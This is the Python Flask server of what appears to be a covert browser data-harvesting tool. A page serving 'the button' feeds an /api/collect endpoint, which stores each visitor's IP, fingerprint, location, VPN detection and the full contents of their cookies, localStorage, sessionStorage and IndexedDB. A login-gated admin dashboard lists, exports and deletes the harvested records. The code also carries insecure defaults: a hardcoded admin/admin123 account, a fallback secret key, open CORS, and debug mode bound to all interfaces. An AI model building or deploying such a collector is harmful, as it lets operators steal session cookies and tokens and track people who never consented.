from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from datetime import datetime
import sqlite3
import hashlib
import json
import os

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this-in-production')
CORS(app)

# Database setup
DB_PATH = 'user_data.db'

def init_db():
    """Initialize the database with required tables"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Table to store collected user data
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        device_info TEXT,
        fingerprint TEXT,
        location_data TEXT,
        storage_info TEXT,
        connection_info TEXT,
        vpn_detection TEXT,
        raw_data TEXT
    )''')

    # Admin credentials table (username: admin, password: admin123 - CHANGE THIS!)
    c.execute('''CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL
    )''')

    # Check if admin exists, if not create default admin
    c.execute('SELECT * FROM admin_users WHERE username = ?', ('admin',))
    if not c.fetchone():
        # Default password: admin123 (CHANGE THIS!)
        password_hash = hashlib.sha256('admin123'.encode()).hexdigest()
        c.execute('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)',
                  ('admin', password_hash))

    conn.commit()
    conn.close()

# Initialize database on startup
init_db()

@app.route('/')
def index():
    """Serve the main page with the button"""
    return render_template('index.html')

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """API endpoint to receive data from frontend"""
    try:
        data = request.json
        timestamp = datetime.now().isoformat()

        # Get client IP
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)

        # Extract data from the payload
        device_info = json.dumps(data.get('deviceInfo', {}))
        fingerprint = data.get('fingerprint', {}).get('fp', '')
        location_data = json.dumps(data.get('ipInfo', {}))
        storage_info = json.dumps({
            'cookies': data.get('cookies', []),
            'localStorage': data.get('localStorage', {}),
            'sessionStorage': data.get('sessionStorage', {}),
            'indexedDB': data.get('indexedDB', {})
        })
        connection_info = json.dumps(data.get('connectionInfo', {}))
        vpn_detection = json.dumps(data.get('vpnDetection', {}))
        user_agent = request.headers.get('User-Agent', '')
        raw_data = json.dumps(data)

        # Store in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO collected_data
                     (timestamp, ip_address, user_agent, device_info, fingerprint,
                      location_data, storage_info, connection_info, vpn_detection, raw_data)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (timestamp, ip_address, user_agent, device_info, fingerprint,
                   location_data, storage_info, connection_info, vpn_detection, raw_data))
        conn.commit()
        conn.close()

        return jsonify({'status': 'success', 'message': 'Data collected successfully'}), 200

    except Exception as e:
        print(f"Error collecting data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        password_hash = hashlib.sha256(password.encode()).hexdigest()

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT * FROM admin_users WHERE username = ? AND password_hash = ?',
                  (username, password_hash))
        user = c.fetchone()
        conn.close()

        if user:
            session['admin_logged_in'] = True
            session['username'] = username
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template('login.html', error='Invalid credentials')

    return render_template('login.html')

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard to view all collected data"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    # Convert rows to list of dictionaries
    data = []
    for row in rows:
        data.append({
            'id': row[0],
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': row[5],
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {},
            'raw_data': row[10]
        })

    return render_template('dashboard.html', data=data, count=len(data))

@app.route('/admin/api/data')
def admin_api_data():
    """API endpoint for admin to get all data as JSON"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    data = []
    for row in rows:
        data.append({
            'id': row[0],
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': row[5],
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {}
        })

    return jsonify(data)

@app.route('/admin/api/delete/<int:id>', methods=['DELETE'])
def delete_entry(id):
    """Delete a specific entry"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM collected_data WHERE id = ?', (id,))
    conn.commit()
    conn.close()

    return jsonify({'status': 'success', 'message': 'Entry deleted'})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)